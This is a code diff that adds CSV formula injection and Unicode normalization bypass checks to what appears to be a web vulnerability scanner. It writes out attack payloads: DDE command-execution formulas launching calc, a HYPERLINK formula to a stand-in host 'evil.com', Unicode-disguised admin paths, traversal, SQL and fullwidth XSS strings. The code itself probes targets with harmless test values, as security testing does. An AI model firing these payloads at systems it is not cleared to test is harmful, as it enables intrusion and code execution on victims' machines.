@@ -17848,3 +17848,136 @@ def _safe_exploit_takeover(finding):
     except Exception:
         pass
     return None
+
+
+# ---------------------------------------------------------------------------
+# Missing vulnerability types: CSV injection, Unicode normalization
+# ---------------------------------------------------------------------------
+
+def scan_csv_formula_injection(crawl_data):
+    """CSV/Formula injection — inject formulas that execute when opened in Excel/Sheets."""
+    findings = []
+    formula_payloads = [
+        "=CMD('calc')",
+        "=HYPERLINK(\"http://evil.com\")",
+        "+cmd|'/C calc'!A0",
+        "-cmd|'/C calc'!A0",
+        "@SUM(1+1)*cmd|'/C calc'!A0",
+        "=1+1",  # Harmless test — if this evaluates, formulas work
+    ]
+
+    # Find export/download/CSV endpoints
+    for url in list(crawl_data.get("params", {}).keys())[:20]:
+        if any(x in url.lower() for x in ["export", "csv", "download", "report", "spreadsheet"]):
+            for p in crawl_data.get("params", {}).get(url, []):
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = ["=1+1"]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                try:
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    ct = r.headers.get("content-type", "")
+                    if "csv" in ct or "spreadsheet" in ct or "excel" in ct:
+                        if "=1+1" in r.text:
+                            findings.append({
+                                "type": "CSV/Formula Injection",
+                                "severity": "medium",
+                                "url": test_url,
+                                "detail": f"Formula '=1+1' injected into CSV export via param '{p}'. Opens RCE vector in Excel.",
+                                "template": "apex-csv-inject",
+                            })
+                            break
+                except Exception:
+                    continue
+
+    # Also test form fields that might end up in exports
+    for form in crawl_data.get("forms", [])[:10]:
+        action = form.get("action", "")
+        if not action:
+            continue
+        inputs = form.get("inputs", [])
+        for inp in inputs:
+            name = inp.get("name", "")
+            if any(x in name.lower() for x in ["name", "email", "company", "address", "comment", "note"]):
+                data = {i.get("name", "x"): i.get("value", "test") for i in inputs if i.get("name")}
+                data[name] = "=1+1"
+                try:
+                    r = _S.post(action, data=data, timeout=_TIMEOUT)
+                    if r.status_code in (200, 201, 302):
+                        findings.append({
+                            "type": "CSV Formula Injection (Stored)",
+                            "severity": "medium",
+                            "url": action,
+                            "detail": f"Formula payload accepted in field '{name}'. If exported to CSV/Excel, executes on victim's machine.",
+                            "template": "apex-csv-inject-stored",
+                        })
+                        break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_unicode_normalization(crawl_data, web_targets):
+    """Unicode normalization attacks — bypass filters via equivalent Unicode characters."""
+    findings = []
+    # Unicode equivalents that bypass filters
+    unicode_bypasses = [
+        # Admin access via Unicode normalization
+        ("admin", "ⓐⓓⓜⓘⓝ", "circled letters"),
+        ("admin", "ᴬᴰᴹᴵᴺ", "modifier letters"),
+        ("admin", "𝐚𝐝𝐦𝐢𝐧", "mathematical bold"),
+        # Path traversal via Unicode
+        ("../", "‥/", "two-dot leader"),
+        ("../", "．．/", "fullwidth dots"),
+        # XSS via Unicode
+        ("<script>", "＜script＞", "fullwidth angle brackets"),
+        # SQL via Unicode
+        ("' OR", "＇ OR", "fullwidth apostrophe"),
+    ]
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        # Test if server normalizes Unicode in paths
+        for original, unicode_ver, desc in unicode_bypasses[:3]:
+            if original == "admin":
+                test_url = f"{base}/{unicode_ver}"
+                try:
+                    r = _S.get(test_url, timeout=_TIMEOUT_SHORT)
+                    r_normal = _S.get(f"{base}/{original}", timeout=_TIMEOUT_SHORT)
+                    # If Unicode version gives same response as ASCII, normalization happens
+                    if r.status_code == r_normal.status_code and r.status_code != 404:
+                        if abs(len(r.text) - len(r_normal.text)) < 100:
+                            findings.append({
+                                "type": f"Unicode Normalization Bypass ({desc})",
+                                "severity": "high",
+                                "url": test_url,
+                                "detail": f"Server normalizes '{unicode_ver}' to '{original}'. Can bypass WAF/filters.",
+                                "template": "apex-unicode-norm",
+                            })
+                            break
+                except Exception:
+                    continue
+
+    # Test in params
+    for url, params in list(crawl_data.get("params", {}).items())[:10]:
+        for p in params[:2]:
+            parsed = urllib.parse.urlparse(url)
+            qs = urllib.parse.parse_qs(parsed.query)
+            # Try fullwidth XSS
+            qs[p] = ["＜img src=x onerror=alert(1)＞"]
+            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+            try:
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                # If server normalized fullwidth to ASCII
+                if "<img src=x onerror=alert(1)>" in r.text:
+                    findings.append({
+                        "type": "Unicode Normalization → XSS",
+                        "severity": "high",
+                        "url": test_url,
+                        "detail": f"Fullwidth Unicode normalized to ASCII in param '{p}'. Bypasses XSS filters.",
+                        "template": "apex-unicode-xss",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
